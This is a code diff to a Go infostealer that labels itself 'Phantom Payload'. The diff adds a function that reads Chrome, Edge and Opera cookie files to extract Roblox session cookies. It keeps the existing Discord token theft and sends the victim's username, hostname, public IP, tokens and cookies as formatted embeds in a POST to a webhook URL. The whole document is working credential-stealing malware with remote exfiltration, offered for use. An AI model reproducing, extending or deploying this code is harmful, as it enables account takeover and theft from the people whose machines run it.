@@ -6,7 +6,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"mime/multipart"
 	"net/http"
 	"os"
 	"os/user"
@@ -24,15 +23,16 @@ var (
 )
 
 type SystemReport struct {
-	Username  string   `json:"username"`
-	Hostname  string   `json:"hostname"`
-	OS        string   `json:"os"`
-	Arch      string   `json:"arch"`
-	CPUs      int      `json:"cpus"`
-	PublicIP  string   `json:"public_ip"`
-	Tokens    []string `json:"tokens"`
-	Browsers  []string `json:"browsers_found"`
-	Timestamp string   `json:"timestamp"`
+	Username      string   `json:"username"`
+	Hostname      string   `json:"hostname"`
+	OS            string   `json:"os"`
+	Arch          string   `json:"arch"`
+	CPUs          int      `json:"cpus"`
+	PublicIP      string   `json:"public_ip"`
+	DiscordTokens []string `json:"discord_tokens"`
+	RobloxCookies []string `json:"roblox_cookies"`
+	Browsers      []string `json:"browsers_found"`
+	Timestamp     string   `json:"timestamp"`
 }
 
 func main() {
@@ -61,7 +61,8 @@ func gatherEverything() SystemReport {
 		Timestamp: Timestamp,
 	}
 
-	report.Tokens = extractDiscordTokens()
+	report.DiscordTokens = extractDiscordTokens()
+	report.RobloxCookies = extractRobloxCookies()
 	report.Browsers = findBrowsers()
 
 	return report
@@ -139,6 +140,34 @@ func extractDiscordTokens() []string {
 	return tokens
 }
 
+func extractRobloxCookies() []string {
+	var cookies []string
+	home, _ := os.UserHomeDir()
+
+	paths := []string{
+		filepath.Join(home, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
+		filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
+		filepath.Join(home, "AppData", "Roaming", "Opera Software", "Opera Stable", "Network", "Cookies"),
+	}
+
+	re := regexp.MustCompile(`_\|WARNING:-DO-NOT-SHARE-.*\|_[\w\d]+`)
+
+	for _, path := range paths {
+		content, err := os.ReadFile(path)
+		if err != nil {
+			continue
+		}
+
+		matches := re.FindAllString(string(content), -1)
+		for _, match := range matches {
+			if !contains(cookies, match) {
+				cookies = append(cookies, match)
+			}
+		}
+	}
+	return cookies
+}
+
 func contains(slice []string, item string) bool {
 	for _, s := range slice {
 		if s == item {
@@ -148,41 +177,83 @@ func contains(slice []string, item string) bool {
 	return false
 }
 
+func formatList(list []string, limit int) string {
+	if len(list) == 0 {
+		return "❌ No data found"
+	}
+	res := ""
+	for i, item := range list {
+		if i >= limit {
+			res += fmt.Sprintf("\n... and %d more items", len(list)-limit)
+			break
+		}
+		res += fmt.Sprintf("`%s` \n", item)
+	}
+	if len(res) > 1000 {
+		return res[:997] + "..."
+	}
+	return res
+}
+
 func sendReport(report SystemReport) {
-	// Create JSON data
-	data, _ := json.MarshalIndent(report, "", "  ")
-
-	// Prepare multipart form
-	body := &bytes.Buffer{}
-	writer := multipart.NewWriter(body)
-
-	// Add embed part (simplified for the file approach)
-	part, _ := writer.CreateFormField("payload_json")
-	embedJSON := map[string]interface{}{
-		"content": "👻 **Phantom Payload - Full Report**",
-		"embeds": []map[string]interface{}{
-			{
-				"title": "System Summary",
-				"color": 0xff0000,
-				"fields": []map[string]interface{}{
-					{"name": "User", "value": fmt.Sprintf("`%s`", report.Username), "inline": true},
-					{"name": "IP", "value": fmt.Sprintf("`%s`", report.PublicIP), "inline": true},
-					{"name": "Tokens Found", "value": fmt.Sprintf("`%d`", len(report.Tokens)), "inline": true},
-				},
+	// Construction de l'interface visuelle via plusieurs embeds
+	embeds := []map[string]interface{}{
+		{
+			"title": "👻 Phantom Payload Executed",
+			"color": 0x2c3e50,
+			"fields": []map[string]interface{}{
+				{"name": "👤 User", "value": fmt.Sprintf("`%s`", report.Username), "inline": true},
+				{"name": "💻 Hostname", "value": fmt.Sprintf("`%s`", report.Hostname), "inline": true},
+				{"name": "🌐 Public IP", "value": fmt.Sprintf("`%s`", report.PublicIP), "inline": true},
+				{"name": "🖥️ OS", "value": fmt.Sprintf("`%s (%s)`", report.OS, report.Arch), "inline": true},
+				{"name": "⚙️ CPUs", "value": fmt.Sprintf("`%d`", report.CPUs), "inline": true},
+				{"name": "🕒 Generated At", "value": fmt.Sprintf("`%s`", report.Timestamp), "inline": false},
+				{"name": "🌐 Browsers Found", "value": fmt.Sprintf("`%s`", strings.Join(report.Browsers, ", ")), "inline": false},
 			},
+			"footer": map[string]string{"text": "Phantom Generator v1.0 | System Report"},
 		},
 	}
-	payloadJSON, _ := json.Marshal(embedJSON)
-	part.Write(payloadJSON)
 
-	// Add the full data as a file
-	filePart, _ := writer.CreateFormFile("file", "report.json")
-	filePart.Write(data)
-	writer.Close()
+	// Embed pour les Tokens Discord
+	if len(report.DiscordTokens) > 0 {
+		embeds = append(embeds, map[string]interface{}{
+			"title":       "📱 Discord Tokens Captured",
+			"color":       0x5865F2,
+			"description": formatList(report.DiscordTokens, 8),
+			"footer":      map[string]string{"text": fmt.Sprintf("Total Tokens: %d", len(report.DiscordTokens))},
+		})
+	} else {
+		embeds = append(embeds, map[string]interface{}{
+			"title":       "📱 Discord Tokens",
+			"color":       0xe74c3c,
+			"description": "❌ No Discord tokens found on this system.",
+		})
+	}
 
-	// Send request
-	req, _ := http.NewRequest("POST", WebhookURL, body)
-	req.Header.Set("Content-Type", writer.FormDataContentType())
+	// Embed pour les Cookies Roblox
+	if len(report.RobloxCookies) > 0 {
+		embeds = append(embeds, map[string]interface{}{
+			"title":       "🎮 Roblox Cookies Captured",
+			"color":       0xFFFFFF,
+			"description": formatList(report.RobloxCookies, 5),
+			"footer":      map[string]string{"text": fmt.Sprintf("Total Cookies: %d", len(report.RobloxCookies))},
+		})
+	} else {
+		embeds = append(embeds, map[string]interface{}{
+			"title":       "🎮 Roblox Cookies",
+			"color":       0xe74c3c,
+			"description": "❌ No Roblox cookies found on this system.",
+		})
+	}
+
+	payload := map[string]interface{}{
+		"embeds": embeds,
+	}
+
+	jsonData, _ := json.Marshal(payload)
+
+	req, _ := http.NewRequest("POST", WebhookURL, bytes.NewBuffer(jsonData))
+	req.Header.Set("Content-Type", "application/json")
 
 	client := &http.Client{
 		Transport: &http.Transport{
